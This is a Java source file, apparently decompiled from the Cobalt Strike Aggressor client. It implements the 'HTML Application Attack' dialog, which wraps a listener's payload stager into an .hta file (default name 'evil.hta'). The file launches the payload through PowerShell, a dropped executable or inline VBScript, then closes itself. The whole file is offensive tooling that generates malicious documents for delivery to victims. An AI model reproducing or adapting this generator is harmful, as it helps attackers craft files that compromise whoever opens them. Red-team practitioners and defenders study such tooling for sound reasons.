package aggressor.dialogs;

import aggressor.AggressorClient;
import common.CommonUtils;
import common.ListenerUtils;
import common.MutantResourceUtils;
import common.ScListener;
import dialog.DialogListener;
import dialog.DialogManager;
import dialog.DialogUtils;
import dialog.SafeDialogCallback;
import dialog.SafeDialogs;
import java.awt.event.ActionEvent;
import java.io.File;
import java.util.Map;
import javax.swing.JButton;
import javax.swing.JFrame;

public class HTMLApplicationDialog implements DialogListener, SafeDialogCallback {
   protected AggressorClient client;
   protected JFrame dialog = null;
   protected Map options;

   public HTMLApplicationDialog(AggressorClient var1) {
      this.client = var1;
   }

   public void dialogAction(ActionEvent var1, Map var2) {
      this.options = var2;
      SafeDialogs.saveFile((JFrame)null, "evil.hta", this);
   }

   public void dialogResult(String var1) {
      String var2 = DialogUtils.string(this.options, "listener");
      String var3 = DialogUtils.string(this.options, "method");
      ScListener var4 = ListenerUtils.getListener(this.client, var2);
      byte[] var5 = var4.getPayloadStager("x86");
      if ("PowerShell".equals(var3)) {
         CommonUtils.writeToFile(new File(var1), (new MutantResourceUtils(this.client)).buildHTMLApplicationPowerShell(var5));
      } else {
         String var6;
         if ("Executable".equals(var3)) {
            var6 = CommonUtils.strrep((new File(var1)).getName(), ".hta", ".exe");
            byte[] var7 = (new MutantResourceUtils(this.client)).buildHTMLApplicationEXE(var5, var6);
            CommonUtils.writeToFile(new File(var1), var7);
         } else if ("VBA".equals(var3)) {
            var6 = "<html><head><script language=\"vbscript\">\n";
            var6 = var6 + CommonUtils.bString((new MutantResourceUtils(this.client)).buildVBS(var5)) + "\n";
            var6 = var6 + "self.close\n";
            var6 = var6 + "</script></head></html>";
            CommonUtils.writeToFile(new File(var1), CommonUtils.toBytes(var6));
         }
      }

      DialogUtils.showInfo("Congrats. You're the owner of an HTML app package.");
   }

   public void show() {
      this.dialog = DialogUtils.dialog("HTML Application Attack", 640, 480);
      DialogManager var1 = new DialogManager(this.dialog);
      var1.addDialogListener(this);
      var1.sc_listener_stagers("listener", "Listener:", this.client);
      var1.combobox("method", "Method:  ", CommonUtils.toArray("Executable, PowerShell, VBA"));
      JButton var2 = var1.action("Generate");
      JButton var3 = var1.help("https://www.cobaltstrike.com/help-html-application-attack");
      this.dialog.add(DialogUtils.description("This package generates an HTML application that runs a payload."), "North");
      this.dialog.add(var1.layout(), "Center");
      this.dialog.add(DialogUtils.center(var2, var3), "South");
      this.dialog.pack();
      this.dialog.setVisible(true);
   }
}
